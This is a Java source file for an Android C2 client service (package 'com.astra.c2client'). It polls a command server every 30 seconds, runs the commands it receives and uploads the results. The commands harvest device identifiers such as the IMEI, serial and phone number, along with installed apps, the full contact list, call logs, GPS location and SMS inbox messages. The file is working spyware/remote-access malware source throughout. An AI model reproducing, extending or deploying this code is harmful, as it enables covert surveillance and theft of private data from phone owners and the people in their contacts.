package com.astra.c2client;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CommandExecutorService extends Service {
    private static final String TAG = "AstraC2-CmdExec";
    private static final int COMMAND_POLL_INTERVAL_SECONDS = 30;

    private ScheduledExecutorService scheduler;
    private SharedPreferences sharedPreferences;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "CommandExecutorService created");
        scheduler = Executors.newSingleThreadScheduledExecutor();
        sharedPreferences = getSharedPreferences(Config.PREFS_NAME, MODE_PRIVATE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CommandExecutorService started");

        if (!isRunning) {
            startCommandPoller();
            isRunning = true;
        }

        return START_STICKY;
    }

    private void startCommandPoller() {
        // Schedule the command polling task
        scheduler.scheduleAtFixedRate(
            this::pollCommands,
            5, // wait 5 seconds before first poll
            COMMAND_POLL_INTERVAL_SECONDS,
            TimeUnit.SECONDS
        );

        logToMain("Command polling service started, interval: " + COMMAND_POLL_INTERVAL_SECONDS + " seconds");
    }

    private void pollCommands() {
        try {
            // Check if device is registered
            String deviceId = sharedPreferences.getString(Config.PREF_DEVICE_ID, null);
            String authToken = sharedPreferences.getString(Config.PREF_AUTH_TOKEN, null);

            if (deviceId == null || authToken == null) {
                logToMain("Device not registered. Cannot poll for commands.");
                return;
            }

            // Prepare request parameters
            Map<String, String> params = new HashMap<>();
            params.put("device_id", deviceId);
            params.put("auth_token", authToken);

            // Send the request to get a command
            try {
                JSONObject response = ApiClient.sendPostRequest(Config.ENDPOINT_GET_COMMAND, params);

                // Check if there is a command to execute
                if (response.has("command") && !response.isNull("command")) {
                    String commandId = response.getString("command_id");
                    String command = response.getString("command");
                    String issuedAt = response.getString("issued_at");

                    logToMain("Received command: " + command);

                    // Execute the command and get the result
                    String result = executeCommand(command);

                    // Send the command output back to the server
                    sendCommandOutput(deviceId, authToken, commandId, result);
                } else {
                    Log.d(TAG, "No pending commands");
                }
            } catch (IOException | JSONException e) {
                logToMain("Command polling error: " + e.getMessage());
                Log.e(TAG, "Command polling error", e);
            }
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error in command polling", e);
        }
    }

    private String executeCommand(String command) {
        String result = "";
        String[] parts = command.trim().split("\\s+", 2);
        String mainCommand = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";

        try {
            switch (mainCommand) {
                case "getinfo":
                    result = getDeviceInfo();
                    break;
                case "listapps":
                    result = getInstalledApps();
                    break;
                case "battery":
                    result = getBatteryStatus();
                    break;
                case "contacts":
                    result = getContacts();
                    break;
                case "calls":
                    result = getRecentCalls();
                    break;
                case "location":
                    result = getCurrentLocation();
                    break;
                case "photo":
                    result = takePhoto(args);
                    break;
                case "sms":
                    result = handleSmsCommand(args);
                    break;
                case "netinfo":
                    result = getNetworkInfo();
                    break;
                default:
                    result = "Unknown command: " + mainCommand;
            }
        } catch (Exception e) {
            result = "Error executing command: " + e.getMessage();
            Log.e(TAG, "Command execution error", e);
        }

        return result;
    }

    private void sendCommandOutput(String deviceId, String authToken, String commandId, String output) {
        try {
            Map<String, String> params = new HashMap<>();
            params.put("device_id", deviceId);
            params.put("auth_token", authToken);
            params.put("command_id", commandId);
            params.put("type", "command_output");
            params.put("content", output);

            JSONObject response = ApiClient.sendPostRequest(Config.ENDPOINT_SEND_LOG, params);

            if (response.has("status") && response.getString("status").equals("success")) {
                logToMain("Command output sent successfully");
            } else {
                logToMain("Failed to send command output: " + response.optString("error", "Unknown error"));
            }
        } catch (IOException | JSONException e) {
            logToMain("Error sending command output: " + e.getMessage());
            Log.e(TAG, "Error sending command output", e);
        }
    }

    // Command implementation methods
    private String getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("brand", Build.BRAND);
            info.put("device", Build.DEVICE);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk_level", Build.VERSION.SDK_INT);
            info.put("build_id", Build.ID);
            info.put("serial", Build.getSerial());
            info.put("android_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));

            // Add more device-specific info
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone_number", telephonyManager.getLine1Number());
                info.put("network_operator", telephonyManager.getNetworkOperatorName());
                info.put("sim_operator", telephonyManager.getSimOperatorName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    info.put("imei", telephonyManager.getImei());
                }
            }

            return info.toString(2);
        } catch (JSONException e) {
            return "Error generating device info: " + e.getMessage();
        }
    }

    private String getInstalledApps() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        JSONArray appsArray = new JSONArray();
        try {
            for (ApplicationInfo appInfo : packages) {
                JSONObject app = new JSONObject();
                app.put("name", appInfo.loadLabel(pm).toString());
                app.put("package", appInfo.packageName);
                app.put("system_app", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                appsArray.put(app);
            }
            return "Found " + packages.size() + " applications:\n" + appsArray.toString(2);
        } catch (JSONException e) {
            return "Error listing applications: " + e.getMessage();
        }
    }

    private String getBatteryStatus() {
        BatteryManager batteryManager = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
        int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        int batteryVoltage = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_VOLTAGE);
        boolean isCharging = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS) == BatteryManager.BATTERY_STATUS_CHARGING;

        try {
            JSONObject batteryInfo = new JSONObject();
            batteryInfo.put("level", batteryLevel + "%");
            batteryInfo.put("voltage", batteryVoltage + " mV");
            batteryInfo.put("charging", isCharging);
            batteryInfo.put("temperature", batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_TEMPERATURE) / 10.0f + "°C");
            batteryInfo.put("health", batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_HEALTH));

            return batteryInfo.toString(2);
        } catch (JSONException e) {
            return "Error getting battery status: " + e.getMessage();
        }
    }

    private String getContacts() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return "No permission to read contacts";
        }

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        JSONArray contactsArray = new JSONArray();
        if (cursor != null && cursor.getCount() > 0) {
            try {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    
                    // Get phone numbers
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor phoneCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        
                        JSONArray phones = new JSONArray();
                        while (phoneCursor != null && phoneCursor.moveToNext()) {
                            String phoneNo = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.put(phoneNo);
                        }
                        
                        if (phoneCursor != null) {
                            phoneCursor.close();
                        }
                        
                        contact.put("phones", phones);
                    }
                    
                    // Get emails
                    Cursor emailCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    
                    JSONArray emails = new JSONArray();
                    while (emailCursor != null && emailCursor.moveToNext()) {
                        String email = emailCursor.getString(emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        emails.put(email);
                    }
                    
                    if (emailCursor != null) {
                        emailCursor.close();
                    }
                    
                    contact.put("emails", emails);
                    contactsArray.put(contact);
                }
                
                cursor.close();
                return "Found " + contactsArray.length() + " contacts:\n" + contactsArray.toString(2);
            } catch (JSONException e) {
                if (cursor != null) {
                    cursor.close();
                }
                return "Error retrieving contacts: " + e.getMessage();
            }
        } else {
            if (cursor != null) {
                cursor.close();
            }
            return "No contacts found";
        }
    }

    private String getRecentCalls() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return "No permission to read call logs";
        }

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");

        JSONArray callsArray = new JSONArray();
        if (cursor != null && cursor.getCount() > 0) {
            try {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String type = getCallType(cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(new Date(Long.parseLong(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)))));
                    int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    
                    JSONObject call = new JSONObject();
                    call.put("number", number);
                    call.put("name", name != null ? name : "Unknown");
                    call.put("type", type);
                    call.put("date", date);
                    call.put("duration", duration + " seconds");
                    
                    callsArray.put(call);
                }
                
                cursor.close();
                return "Found " + callsArray.length() + " recent calls:\n" + callsArray.toString(2);
            } catch (JSONException e) {
                if (cursor != null) {
                    cursor.close();
                }
                return "Error retrieving call logs: " + e.getMessage();
            }
        } else {
            if (cursor != null) {
                cursor.close();
            }
            return "No call logs found";
        }
    }

    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            case CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            default:
                return "Unknown";
        }
    }

    private String getCurrentLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return "No location permissions granted";
        }

        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Location location = null;
        
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }
        
        if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }
        
        if (location != null) {
            try {
                JSONObject locationData = new JSONObject();
                locationData.put("latitude", location.getLatitude());
                locationData.put("longitude", location.getLongitude());
                locationData.put("altitude", location.getAltitude());
                locationData.put("accuracy", location.getAccuracy());
                locationData.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        .format(new Date(location.getTime())));
                locationData.put("provider", location.getProvider());
                
                // Add Google Maps link
                locationData.put("maps_url", "https://www.google.com/maps?q=" + location.getLatitude() + "," + location.getLongitude());
                
                // Send this as a GPS log too
                sendLocationLog(locationData);
                
                return locationData.toString(2);
            } catch (JSONException e) {
                return "Error formatting location data: " + e.getMessage();
            }
        } else {
            return "Could not get current location. No provider enabled or location not available.";
        }
    }

    private void sendLocationLog(JSONObject locationData) {
        try {
            String deviceId = sharedPreferences.getString(Config.PREF_DEVICE_ID, null);
            String authToken = sharedPreferences.getString(Config.PREF_AUTH_TOKEN, null);
            
            if (deviceId == null || authToken == null) {
                return;
            }
            
            Map<String, String> params = new HashMap<>();
            params.put("device_id", deviceId);
            params.put("auth_token", authToken);
            params.put("type", "gps");
            params.put("content", locationData.toString());
            
            ApiClient.sendPostRequest(Config.ENDPOINT_SEND_LOG, params);
        } catch (Exception e) {
            Log.e(TAG, "Error sending location log", e);
        }
    }

    private String takePhoto(String args) {
        return "Photo capture not implemented in this version";
    }

    private String handleSmsCommand(String args) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return "No permission to read SMS";
        }

        String[] parts = args.split("\\s+", 2);
        String subCommand = parts[0].toLowerCase();
        
        if ("list".equals(subCommand)) {
            return listSms();
        } else {
            return "Unknown SMS sub-command: " + subCommand;
        }
    }

    private String listSms() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50");

        JSONArray smsArray = new JSONArray();
        if (cursor != null && cursor.getCount() > 0) {
            try {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(new Date(Long.parseLong(cursor.getString(cursor.getColumnIndex("date")))));
                    
                    JSONObject sms = new JSONObject();
                    sms.put("from", address);
                    sms.put("body", body);
                    sms.put("date", date);
                    
                    smsArray.put(sms);
                }
                
                cursor.close();
                return "Found " + smsArray.length() + " SMS messages:\n" + smsArray.toString(2);
            } catch (JSONException e) {
                if (cursor != null) {
                    cursor.close();
                }
                return "Error retrieving SMS: " + e.getMessage();
            }
        } else {
            if (cursor != null) {
                cursor.close();
            }
            return "No SMS messages found";
        }
    }

    private String getNetworkInfo() {
        try {
            JSONObject networkInfo = new JSONObject();
            
            // Get active network interfaces
            JSONArray interfaces = new JSONArray();
            for (NetworkInterface nif : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (nif.isUp()) {
                    JSONObject netInterface = new JSONObject();
                    netInterface.put("name", nif.getName());
                    netInterface.put("display_name", nif.getDisplayName());
                    
                    JSONArray addresses = new JSONArray();
                    for (java.net.InetAddress addr : Collections.list(nif.getInetAddresses())) {
                        if (!addr.isLoopbackAddress()) {
                            addresses.put(addr.getHostAddress());
                        }
                    }
                    
                    netInterface.put("addresses", addresses);
                    interfaces.put(netInterface);
                }
            }
            
            networkInfo.put("interfaces", interfaces);
            
            // TelephonyManager for cellular network info
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            
            JSONObject cellularInfo = new JSONObject();
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                cellularInfo.put("operator_name", tm.getNetworkOperatorName());
                cellularInfo.put("sim_operator", tm.getSimOperatorName());
                cellularInfo.put("network_type", getNetworkTypeName(tm.getNetworkType()));
                cellularInfo.put("phone_type", getPhoneTypeName(tm.getPhoneType()));
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    cellularInfo.put("signal_strength", tm.getSignalStrength());
                }
            } else {
                cellularInfo.put("error", "No permission to read phone state");
            }
            
            networkInfo.put("cellular", cellularInfo);
            
            return networkInfo.toString(2);
        } catch (Exception e) {
            return "Error retrieving network info: " + e.getMessage();
        }
    }

    private String getNetworkTypeName(int type) {
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return "GPRS";
            case TelephonyManager.NETWORK_TYPE_EDGE:
                return "EDGE";
            case TelephonyManager.NETWORK_TYPE_UMTS:
                return "UMTS";
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                return "HSDPA";
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                return "HSUPA";
            case TelephonyManager.NETWORK_TYPE_HSPA:
                return "HSPA";
            case TelephonyManager.NETWORK_TYPE_CDMA:
                return "CDMA";
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                return "EVDO_0";
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                return "EVDO_A";
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
                return "EVDO_B";
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                return "1xRTT";
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return "IDEN";
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "LTE";
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                return "EHRPD";
            case TelephonyManager.NETWORK_TYPE_HSPAP:
                return "HSPAP";
            case TelephonyManager.NETWORK_TYPE_GSM:
                return "GSM";
            case TelephonyManager.NETWORK_TYPE_TD_SCDMA:
                return "TD_SCDMA";
            case TelephonyManager.NETWORK_TYPE_IWLAN:
                return "IWLAN";
            default:
                return "UNKNOWN";
        }
    }

    private String getPhoneTypeName(int type) {
        switch (type) {
            case TelephonyManager.PHONE_TYPE_GSM:
                return "GSM";
            case TelephonyManager.PHONE_TYPE_CDMA:
                return "CDMA";
            case TelephonyManager.PHONE_TYPE_SIP:
                return "SIP";
            case TelephonyManager.PHONE_TYPE_NONE:
                return "NONE";
            default:
                return "UNKNOWN";
        }
    }

    private void logToMain(String message) {
        Log.d(TAG, message);
        
        Intent intent = new Intent(Config.ACTION_LOG_MESSAGE);
        intent.putExtra(Config.EXTRA_LOG_MESSAGE, message);
        sendBroadcast(intent);
        
        // Update MainActivity log directly if it's in foreground
        if (MainActivity.isActive()) {
            MainActivity mainActivity = MainActivity.getInstance();
            if (mainActivity != null) {
                mainActivity.appendToLog(message);
            }
        }
    }

    @Override
    public void onDestroy() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
            logToMain("Command executor service stopped");
        }
        
        isRunning = false;
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
